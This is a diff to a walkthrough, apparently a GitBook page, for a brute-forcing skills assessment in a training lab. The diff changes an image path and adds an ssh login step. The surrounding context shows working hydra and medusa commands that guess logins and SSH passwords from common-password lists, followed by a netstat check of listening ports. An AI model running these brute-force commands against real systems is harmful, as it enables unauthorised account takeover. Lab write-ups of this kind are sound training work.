@@ -16,7 +16,7 @@ hydra -L top-users.txt -P 2023-200_most_used_passwords.txt -s 40526 94.237.50.22
 
 * After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -35,6 +35,10 @@ medusa -h 94.237.121.185 -n 38159 -u satwossh -P 2023-200_most_used_passwords.tx
 ```
 
 Then witht the crendentials, login and see internal ports -->
+
+```
+ssh satwossh@94.237.59.174 -p 49486
+```
 
 ```
 netstat -tulpn | grep LISTEN
